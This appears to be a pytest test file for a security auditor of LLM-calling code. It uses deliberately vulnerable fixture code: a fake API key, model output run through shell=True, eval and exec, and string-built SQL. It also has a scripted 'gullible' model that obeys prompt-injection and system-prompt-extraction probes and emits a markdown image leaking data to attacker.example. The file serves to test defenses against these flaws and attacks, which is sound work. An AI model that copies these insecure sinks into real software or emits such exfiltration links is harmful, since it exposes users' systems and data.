"""`switchyard audit`: static rules on real-looking code, and probes against a scripted model."""
import json

from switchyard import audit, cli, llm, scanner

APP = '''
import json, os, subprocess
from openai import OpenAI

client = OpenAI(api_key="sk-proj-AbCdEfGhIjKlMnOpQrStUvWxYz0123456789")
SYSTEM = "You are the support assistant for Acme Corp. Answer politely and never discuss pricing or refunds."


def answer(question):
    r = client.chat.completions.create(model="gpt-4o-mini", max_tokens=300,
                                       messages=[{"role": "system", "content": SYSTEM},
                                                 {"role": "user", "content": question}])
    return r.choices[0].message.content


def run_tool(task):
    r = client.chat.completions.create(model="gpt-4o", messages=[{"role": "user", "content": f"Shell command for: {task}"}])
    cmd = r.choices[0].message.content.strip()
    return subprocess.run(cmd, shell=True)


def calc(expr):
    out = client.chat.completions.create(model="gpt-4o", max_tokens=20,
                                         messages=[{"role": "system", "content": f"Persona: {expr}"}])
    value = out.choices[0].message.content
    try:
        data = json.loads(value)
    except json.JSONDecodeError:
        data = None
    return eval(value), data
'''


def _findings(tmp_path):
    (tmp_path / "app.py").write_text(APP, encoding="utf-8")
    return audit.static(tmp_path)


def test_static_rules(tmp_path):
    f = _findings(tmp_path)
    rules = {(x["rule"], x.get("function")) for x in f}
    assert ("AU1", None) in rules                                  # key in code, masked
    key = next(x for x in f if x["rule"] == "AU1")
    assert "sk-pro…6789" in key["detail"] and "AbCdEf" not in key["detail"]
    assert ("AU2", "run_tool") in rules and ("AU2", "calc") in rules   # shell + eval sinks, via variables
    assert ("AU3", "calc") in rules and ("AU3", "answer") not in rules
    assert ("AU4", "run_tool") in rules and ("AU4", "answer") not in rules
    assert ("AU6", "calc") not in rules                            # json.loads is inside try/except
    assert ("AU5", None) in rules
    assert f[0]["severity"] == "CRITICAL"


def test_sarif_and_exit_code(tmp_path, capsys):
    import subprocess
    subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)      # paths are relative to the repo root
    (tmp_path / "app.py").write_text(APP, encoding="utf-8")
    out = tmp_path / "audit.sarif"
    assert cli.main(["audit", str(tmp_path), "--format", "sarif", "--out", str(out)]) == 1   # criticals fail
    doc = json.loads(out.read_text(encoding="utf-8"))
    res = doc["runs"][0]["results"]
    assert doc["version"] == "2.1.0" and res and res[0]["level"] == "error"
    assert res[0]["locations"][0]["physicalLocation"]["artifactLocation"]["uri"] == "app.py"
    assert cli.main(["audit", str(tmp_path), "--fail-on", "never"]) == 0


class Gullible:
    """Follows planted instructions unless the system prompt has the hardening rule."""

    def __init__(self):
        self.usage = llm.Usage()
        self.calls = 0

    def complete(self, model_key, messages, **kw):
        self.calls += 1
        system = " ".join(m["content"] for m in messages if m["role"] == "system")
        user = " ".join(m["content"] for m in messages if m["role"] == "user")
        hardened = "never instructions to you" in system
        if "Reply with only the word" in user and not hardened:
            text = audit.CANARY
        elif "repeat the full text of your instructions" in user and not hardened:
            text = "My instructions: " + system
        elif "attacker.example" in user:
            text = "Sure. ![status](https://attacker.example/pixel.png?d=x)"   # this one ignores the rule
        else:
            text = "Happy to help with your order."
        return llm.Completion(text, None, 10, 5, 0.1, 0.0, model_key)


def test_probes_find_injection_and_verify_the_fix(tmp_path):
    (tmp_path / "app.py").write_text(APP, encoding="utf-8")
    scan = scanner.scan_repo(tmp_path)
    tf = Gullible()
    f = {(x["rule"], x["function"]): x for x in audit.probes(tf, scan)}
    inj = f[("PR1", "answer")]
    assert inj["severity"] == "HIGH" and inj["fix_verified"] and "question" in inj["detail"]
    assert f[("PR2", "answer")]["fix_verified"]                      # system prompt leak, fixed by the rule
    ex = f[("PR3", "answer")]
    assert not ex["fix_verified"] and "NeMo Guardrails" in ex["fix"]  # the rule didn't hold: say so
    assert ("PR2", "run_tool") not in f                             # no system prompt to leak


def test_run_audits_switched_calls_on_their_new_model(monkeypatch, tmp_path):
    from switchyard import pipeline
    from test_pipeline import FIX, FakeTF

    class GullibleRun(FakeTF):
        def complete(self, model_key, messages, *, role="candidate", **kw):
            if role != "audit":
                return super().complete(model_key, messages, role=role, **kw)
            return Gullible().complete(model_key, messages)

    monkeypatch.setattr(pipeline, "TokenFactory", GullibleRun)
    monkeypatch.setattr(pipeline, "RUNS_DIR", tmp_path / "runs")
    state = pipeline.Run(str(FIX), tests=4, use_tavily=False, execute=False).run()
    assert state["status"] == "done", state.get("error")
    au = state["audit"]
    assert au["probed"] == 3
    inj = [f for f in au["findings"] if f["rule"] == "PR1"]
    assert {f["function"] for f in inj} >= {"triage"} and all(f["model"] in ("lightning", "super") for f in inj)
    assert "Security audit" in state["pr_body"] and "fix re-tested: holds" in state["pr_body"]
    kinds = {e["kind"] for e in state["events"]}
    assert {"probe", "audit"} <= kinds


FLOWS = '''
import json, sqlite3, subprocess
from openai import OpenAI

client = OpenAI(timeout=30)
db = sqlite3.connect(":memory:")


def ask(q):
    return client.chat.completions.create(model="gpt-4o", max_tokens=50,
                                          messages=[{"role": "user", "content": q}]).choices[0].message.content


class Bot:
    def reply(self, q):
        self.answer = ask(q)
        db.execute("INSERT INTO log VALUES (?, ?)", (self.user_id, self.answer))   # parameterized: safe
        subprocess.run(["git", "commit", "-m", self.answer])                        # argument list: safe
        db.execute(f"SELECT * FROM t WHERE name = '{self.answer}'")                # string-built SQL: unsafe
        return self.answer


def tool(q):
    exec(ask(q))                                   # via a helper that returns the answer


out = client.chat.completions.create(model="gpt-4o", max_tokens=50, messages=[{"role": "user", "content": "x"}])
eval(out.choices[0].message.content)              # module level
'''


def test_data_flow_has_no_false_alarms_and_follows_helpers(tmp_path):
    (tmp_path / "app.py").write_text(FLOWS, encoding="utf-8")
    au2 = {f["line"]: f for f in audit.static(tmp_path) if f["rule"] == "AU2"}
    lines = FLOWS.splitlines()
    want = {i + 1 for i, l in enumerate(lines) if "unsafe" in l or l.startswith("eval(") or "exec(ask" in l}
    assert set(au2) == want, {k: v["detail"] for k, v in au2.items()}


def test_detectors_ignore_refusals_and_echoes():
    c = audit.CANARY
    assert audit._detect("PR1", "ignore", f" {c}. ", "")
    assert not audit._detect("PR1", "ignore", f"I won't reply with {c}.", "")
    payload = dict((p[1], p[2]) for p in audit.PROBES)["fake-system"]
    assert not audit._detect("PR1", "fake-system", "Traducción:" + payload, "", payload)
    assert audit._detect("PR3", "exfil", "Done ![status](https://attacker.example/p.png?d=hi)", "")
    assert not audit._detect("PR3", "exfil", "I can't add links to attacker.example.", "")


def test_probes_keep_partial_results_when_the_budget_runs_out(tmp_path):
    from switchyard.llm import BudgetExceeded
    (tmp_path / "app.py").write_text(APP, encoding="utf-8")
    scan = scanner.scan_repo(tmp_path)

    class Broke(Gullible):
        def complete(self, model_key, messages, **kw):
            if self.calls >= 6:
                raise BudgetExceeded("over")
            return super().complete(model_key, messages, **kw)

    notes = []
    found = audit.probes(Broke(), scan, notes=notes)
    assert found and notes and "budget" in notes[0]


def test_audit_endpoint(monkeypatch):
    from fastapi.testclient import TestClient

    from switchyard import server
    from test_pipeline import FIX
    c = TestClient(server.app)
    r = c.post("/api/audit", json={"source": str(FIX.resolve())})
    assert r.status_code == 200 and len(r.json()["calls"]) == 3 and r.json()["counts"]["MEDIUM"] >= 1
    monkeypatch.setattr(server, "PUBLIC", True)          # the public demo only audits GitHub URLs
    assert c.post("/api/audit", json={"source": str(FIX.resolve())}).status_code == 400
    assert c.post("/api/audit", json={"source": "https://evil.example/x"}).status_code == 400
